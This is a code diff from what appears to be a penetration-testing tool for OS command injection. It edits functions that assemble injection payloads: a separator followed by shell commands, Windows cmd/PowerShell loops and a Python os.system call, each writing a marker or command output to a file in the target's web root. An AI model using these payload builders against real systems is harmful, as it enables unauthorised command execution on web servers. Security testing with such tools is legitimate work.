@@ -27,15 +27,10 @@ File-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, OUTPUT_TEXTFILE):
 
-  if settings.TARGET_OS == "win":
-    payload = (separator +
-              "powershell.exe -InputFormat none Add-Content " +
-              OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + TAG
-              ) 
-  else:
-    payload = (separator +
-              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
-              ) 
+
+  payload = (separator +
+            "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
+            ) 
 
   return payload
 
@@ -73,22 +68,16 @@ Execute shell commands on vulnerable host.
 def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
   
   if settings.TFB_DECIMAL == True:
-    payload = (separator +cmd)
+    payload = (separator + cmd)
 
   elif settings.TARGET_OS == "win":
     payload = (separator +
               "for /f \"tokens=*\" %i in ('cmd /c \"" +
               "powershell.exe -InputFormat none write-host (cmd /c \"" +
               cmd + 
-              "\")\"') do @set /p =%i " + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "< nul"
+              "\")\"') do @set /p =%i " + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + "<nul"
               ) 
   else:
-    # if settings.USER_AGENT_INJECTION == True or \
-    #    settings.REFERER_INJECTION == True or \
-    #    settings.HOST_INJECTION == True or \
-    #    settings.CUSTOM_HEADER_INJECTION == True:
-    #   if not settings.DEL in cmd:
-    #     cmd = checks.add_command_substitution(cmd)
     payload = (separator +
               cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
@@ -104,7 +93,7 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
       payload = (separator +cmd + " "
                 )
     else:
-      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "')\""
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + "')\""
       payload = (separator +
                 "for /f \"tokens=*\" %i in ('cmd /c " + 
                 python_payload +
